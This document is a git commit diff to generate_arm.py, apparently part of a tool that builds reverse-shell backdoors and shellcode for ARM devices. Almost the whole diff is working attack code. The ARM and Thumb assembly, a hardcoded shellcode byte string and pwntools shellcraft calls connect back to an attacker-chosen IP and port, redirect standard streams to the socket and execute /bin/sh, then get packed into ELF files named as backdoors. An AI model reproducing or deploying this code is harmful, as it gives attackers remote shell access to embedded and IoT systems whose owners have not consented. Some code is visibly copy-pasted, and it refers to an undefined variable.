f60988b65e3b7ac7e19219893ac7fd2d71c80a08
doudoudedi <52043932+doudoudedi@users.noreply.github.com>
2022-04-27 16:58:04 +0800

    Update generate_arm.py

--- source/generate_arm.py
+++ source/generate_arm.py
@@ -21,6 +21,426 @@ def generate_armelv7_backdoor(reverse_ip,reverse_port,filename):
 	all_reverseshell=basic_shellcode+shellcode2+shellcode3
 	data=make_elf(all_reverseshell)
 	if filename==None:
+		filename="backdoor_armelv7"
+		f=open(filename,"wb")
+		f.write(data)
+		f.close()
+		#print disasm(all_reverseshell)
+		print "backdoor_armelv7 is ok in ./"
+	else:
+		f=open(filename,"wb")
+		f.write(data)
+		f.close()
+		#print disasm(all_reverseshell)
+		print "{} is ok in ./"
+
+def generate_armelv7_shellcode(reverse_ip,reverse_port):
+	shellcode='''
+	.ARM
+	eor r4,r4,r4
+	%s
+	strb r7,[sp,#-0x28]
+	%s
+	strb r7,[sp,#-0x27]
+	%s
+	strb r7,[sp,#-0x26]
+	%s
+	strb r7,[sp,#-0x25]
+	mov r7,#2
+	strb r7,[sp,#-0x2c]
+	strb r4,[sp,#-0x2b]
+	mov r7,#%s
+	strb r7,[sp,#-0x2a]
+	mov r7,#%s
+	strb r7,[sp,#-0x29]
+	strb r4,[sp,#-0x14]
+	mov r7,#0x68
+	strb r7,[sp,#-0x15]
+	mov r7,#0x73
+	strb r7,[sp,#-0x16]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x17]
+	mov r7,#0x6e
+	strb r7,[sp,#-0x18]
+	mov r7,#0x69
+	strb r7,[sp,#-0x19]
+	mov r7,#0x62
+	strb r7,[sp,#-0x1a]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x1b]
+	add r4,sp,#-0x1b
+	add r5,sp,#-0x2c
+	add r3,pc,#1
+	bx  r3
+	.THUMB
+	mov r1,#2
+	mov r0,r1
+	mov r1,#1
+	eor r2,r2,r2
+	mov r7,#200
+	add r7,r7,#81
+	svc #1
+	mov r6,r0
+	mov r1,r5
+	mov r2,#0x10
+	add r7,r7,#2
+	svc #1
+	mov r0,r6
+	eor r1,r1,r1
+	mov r7,#63
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r4
+	eor r1,r1,r1
+	eor r2,r2,r2
+	push {r0,r1}
+	mov r1,sp
+	mov r7,#0xb
+	svc #1
+	'''
+	handle_ip=reverse_ip.split('.')
+	handle_port=p16(reverse_port)[::-1]
+	for i in range(len(handle_ip)):
+		if handle_ip[i]!="0":
+			handle_ip[i]="mov r7,#"+handle_ip[i]
+		else:
+			handle_ip[i]="eor r7,r7,r7"
+	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],str(u8(handle_port[0])),str(u8(handle_port[1])))
+	#str(u8(handle_port[0])),str(u8(handle_port[1])
+	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
+	shellcode=asm(shellcode)[:-2]
+	shellcode_hex=''
+	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
+	shellcode_len=len(shellcode)
+	if "\\x00" in shellcode_hex:
+		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
+		print data_shellcode.index("\x00")
+		print shellcode_hex
+	else:
+		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
+		print shellcode_hex
+
+
+def generate_armelv5_backdoor(reverse_ip,reverse_port,filename):
+	shellcode  = '\x01\x30\x8F\xE2\x13\xFF\x2F\xE1\x02\x20\x01\x21\x52\x40\x64\x27'
+	shellcode += '\xB5\x37\x01\xDF\x04\x1C\x0D\xA1\x4A\x70\x10\x22\x02\x37\x01\xDF'
+	shellcode += '\x20\x1C\x49\x40\x3F\x27\x01\xDF\x20\x1C\x01\x31\x01\xDF\x20\x1C'
+	shellcode += '\x01\x31\x01\xDF\x03\xA0\x52\x40\xC2\x71\x05\xB4\x69\x46\x0B\x27'
+	shellcode += '\x01\xDF\x7F\x40\x2F\x62\x69\x6E\x2F\x73\x68\x41\x02\xAA\x11\x5C'
+	shellcode += '\x14\x14\x0B\x0D'
+	data = make_elf(shellcode)
+	if filename==None:
+		filename="backdoor_armelv5"
+		f=open(filename,"wb")
+		f.write(data)
+		f.close()
+		#print disasm(all_reverseshell)
+		print "backdoor_armelv5 is ok in ./"
+	else:
+		f=open(filename,"wb")
+		f.write(data)
+		f.close()
+		#print disasm(all_reverseshell)
+		print "{} is ok in ./"
+
+def generate_armelv5_shellcode(reverse_ip,reverse_port):
+	shellcode='''
+	.ARM
+	eor r4,r4,r4
+	%s
+	strb r7,[sp,#-0x28]
+	%s
+	strb r7,[sp,#-0x27]
+	%s
+	strb r7,[sp,#-0x26]
+	%s
+	strb r7,[sp,#-0x25]
+	mov r7,#2
+	strb r7,[sp,#-0x2c]
+	strb r4,[sp,#-0x2b]
+	mov r7,#%s
+	strb r7,[sp,#-0x2a]
+	mov r7,#%s
+	strb r7,[sp,#-0x29]
+	strb r4,[sp,#-0x14]
+	mov r7,#0x68
+	strb r7,[sp,#-0x15]
+	mov r7,#0x73
+	strb r7,[sp,#-0x16]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x17]
+	mov r7,#0x6e
+	strb r7,[sp,#-0x18]
+	mov r7,#0x69
+	strb r7,[sp,#-0x19]
+	mov r7,#0x62
+	strb r7,[sp,#-0x1a]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x1b]
+	add r4,sp,#-0x1b
+	add r5,sp,#-0x2c
+	add r3,pc,#1
+	bx  r3
+	.THUMB
+	mov r1,#2
+	mov r0,r1
+	mov r1,#1
+	eor r2,r2,r2
+	mov r7,#200
+	add r7,r7,#81
+	svc #1
+	mov r6,r0
+	mov r1,r5
+	mov r2,#0x10
+	add r7,r7,#2
+	svc #1
+	mov r0,r6
+	eor r1,r1,r1
+	mov r7,#63
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r4
+	eor r1,r1,r1
+	eor r2,r2,r2
+	push {r0,r1}
+	mov r1,sp
+	mov r7,#0xb
+	svc #1
+	'''
+	handle_ip=reverse_ip.split('.')
+	handle_port=p16(reverse_port)[::-1]
+	for i in range(len(handle_ip)):
+		if handle_ip[i]!="0":
+			handle_ip[i]="mov r7,#"+handle_ip[i]
+		else:
+			handle_ip[i]="eor r7,r7,r7"
+	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],str(u8(handle_port[0])),str(u8(handle_port[1])))
+	#str(u8(handle_port[0])),str(u8(handle_port[1])
+	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
+	shellcode=asm(shellcode)[:-2]
+	shellcode_hex=''
+	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
+	shellcode_len=len(shellcode)
+	if "\\x00" in shellcode_hex:
+		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
+		print data_shellcode.index("\x00")
+		print shellcode_hex
+	else:
+		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
+		print shellcode_hex
+
+def generate_armebv7_shellcode(reverse_ip,reverse_port):
+	shellcode='''
+	.ARM
+	eor r4,r4,r4
+	%s
+	strb r7,[sp,#-0x28]
+	%s
+	strb r7,[sp,#-0x27]
+	%s
+	strb r7,[sp,#-0x26]
+	%s
+	strb r7,[sp,#-0x25]
+	mov r7,#2
+	strb r7,[sp,#-0x2c]
+	strb r4,[sp,#-0x2b]
+	mov r7,#%s
+	strb r7,[sp,#-0x2a]
+	mov r7,#%s
+	strb r7,[sp,#-0x29]
+	strb r4,[sp,#-0x14]
+	mov r7,#0x68
+	strb r7,[sp,#-0x15]
+	mov r7,#0x73
+	strb r7,[sp,#-0x16]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x17]
+	mov r7,#0x6e
+	strb r7,[sp,#-0x18]
+	mov r7,#0x69
+	strb r7,[sp,#-0x19]
+	mov r7,#0x62
+	strb r7,[sp,#-0x1a]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x1b]
+	add r4,sp,#-0x1b
+	add r5,sp,#-0x2c
+	add r3,pc,#1
+	bx  r3
+	.THUMB
+	mov r1,#2
+	mov r0,r1
+	mov r1,#1
+	eor r2,r2,r2
+	mov r7,#200
+	add r7,r7,#81
+	svc #1
+	mov r6,r0
+	mov r1,r5
+	mov r2,#0x10
+	add r7,r7,#2
+	svc #1
+	mov r0,r6
+	eor r1,r1,r1
+	mov r7,#63
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r4
+	eor r1,r1,r1
+	eor r2,r2,r2
+	push {r0,r1}
+	mov r1,sp
+	mov r7,#0xb
+	svc #1
+	'''
+	handle_ip=reverse_ip.split('.')
+	handle_port=p16(reverse_port)[::-1]
+	for i in range(len(handle_ip)):
+		if handle_ip[i]!="0":
+			handle_ip[i]="mov r7,#"+handle_ip[i]
+		else:
+			handle_ip[i]="eor r7,r7,r7"
+	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],str(u8(handle_port[0])),str(u8(handle_port[1])))
+	#str(u8(handle_port[0])),str(u8(handle_port[1])
+	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
+	shellcode=asm(shellcode)[:-2]
+	shellcode_hex=''
+	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
+	shellcode_len=len(shellcode)
+	if "\\x00" in shellcode_hex:
+		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
+		print data_shellcode.index("\x00")
+		print shellcode_hex
+	else:
+		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
+		print shellcode_hex
+
+def generate_armebv5_shellcode(reverse_ip,reverse_port):
+	shellcode='''
+	.ARM
+	eor r4,r4,r4
+	%s
+	strb r7,[sp,#-0x28]
+	%s
+	strb r7,[sp,#-0x27]
+	%s
+	strb r7,[sp,#-0x26]
+	%s
+	strb r7,[sp,#-0x25]
+	mov r7,#2
+	strb r7,[sp,#-0x2c]
+	strb r4,[sp,#-0x2b]
+	mov r7,#%s
+	strb r7,[sp,#-0x2a]
+	mov r7,#%s
+	strb r7,[sp,#-0x29]
+	strb r4,[sp,#-0x14]
+	mov r7,#0x68
+	strb r7,[sp,#-0x15]
+	mov r7,#0x73
+	strb r7,[sp,#-0x16]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x17]
+	mov r7,#0x6e
+	strb r7,[sp,#-0x18]
+	mov r7,#0x69
+	strb r7,[sp,#-0x19]
+	mov r7,#0x62
+	strb r7,[sp,#-0x1a]
+	mov r7,#0x2f
+	strb r7,[sp,#-0x1b]
+	add r4,sp,#-0x1b
+	add r5,sp,#-0x2c
+	add r3,pc,#1
+	bx  r3
+	.THUMB
+	mov r1,#2
+	mov r0,r1
+	mov r1,#1
+	eor r2,r2,r2
+	mov r7,#200
+	add r7,r7,#81
+	svc #1
+	mov r6,r0
+	mov r1,r5
+	mov r2,#0x10
+	add r7,r7,#2
+	svc #1
+	mov r0,r6
+	eor r1,r1,r1
+	mov r7,#63
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r6
+	add r1,r1,#1
+	svc #1
+	mov r0,r4
+	eor r1,r1,r1
+	eor r2,r2,r2
+	push {r0,r1}
+	mov r1,sp
+	mov r7,#0xb
+	svc #1
+	'''
+	handle_ip=reverse_ip.split('.')
+	handle_port=p16(reverse_port)[::-1]
+	for i in range(len(handle_ip)):
+		if handle_ip[i]!="0":
+			handle_ip[i]="mov r7,#"+handle_ip[i]
+		else:
+			handle_ip[i]="eor r7,r7,r7"
+	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],str(u8(handle_port[0])),str(u8(handle_port[1])))
+	#str(u8(handle_port[0])),str(u8(handle_port[1])
+	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
+	shellcode=asm(shellcode)[:-2]
+	shellcode_hex=''
+	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
+	shellcode_len=len(shellcode)
+	if "\\x00" in shellcode_hex:
+		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
+		print data_shellcode.index("\x00")
+		print shellcode_hex
+	else:
+		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
+		print shellcode_hex
+
+def generate_armebv7_backdoor(reverse_ip,reverse_port,filename):
+	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
+	shellcode2='''
+	mov r5,r6
+	mov r0,r5
+	mov r1,#0
+	movw r7,#0x3f
+	svc #0
+	mov r0,r5
+	mov r1,#1
+	svc #0
+	mov r0,r5
+	mov r1,#2
+	svc #0
+	'''
+	shellcode2=asm(shellcode2)
+	shellcode3=asm(shellcraft.sh())
+	all_reverseshell=basic_shellcode+shellcode2+shellcode3
+	data=make_elf(all_reverseshell)
+	if filename==None:
 		filename="backdoor_armv7"
 		f=open(filename,"wb")
 		f.write(data)
@@ -34,26 +454,36 @@ def generate_armelv7_backdoor(reverse_ip,reverse_port,filename):
 		#print disasm(all_reverseshell)
 		print "{} is ok in ./"
 
-def generate_armelv7_shellcode(reverse_ip,reverse_port):
-	pass
-
-
-def generate_armelv5_backdoor(reverse_ip,reverse_port):
-	pass
-
-
-def generate_armelv5_shellcode(reverse_ip,reverse_port):
-	pass
-
-
-def generate_armebv7_shellcode(reverse_ip,reverse_port):
-	pass
-
-def generate_armebv5_shellcode(reverse_ip,reverse_port):
-	pass
-
-def generate_armebv7_backdoor(reverse_ip,reverse_port,filename):
-	pass
 
 def generate_armebv5_backdoor(reverse_ip,reverse_port,filename):
-	pass
+	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
+	shellcode2='''
+	mov r5,r6
+	mov r0,r5
+	mov r1,#0
+	movw r7,#0x3f
+	svc #0
+	mov r0,r5
+	mov r1,#1
+	svc #0
+	mov r0,r5
+	mov r1,#2
+	svc #0
+	'''
+	shellcode2=asm(shellcode2)
+	shellcode3=asm(shellcraft.sh())
+	all_reverseshell=basic_shellcode+shellcode2+shellcode3
+	data=make_elf(all_reverseshell)
+	if filename==None:
+		filename="backdoor_armebv7"
+		f=open(filename,"wb")
+		f.write(data)
+		f.close()
+		#print disasm(all_reverseshell)
+		print "backdoor_armebv7 is ok in ./"
+	else:
+		f=open(filename,"wb")
+		f.write(data)
+		f.close()
+		#print disasm(all_reverseshell)
+		print "{} is ok in ./"
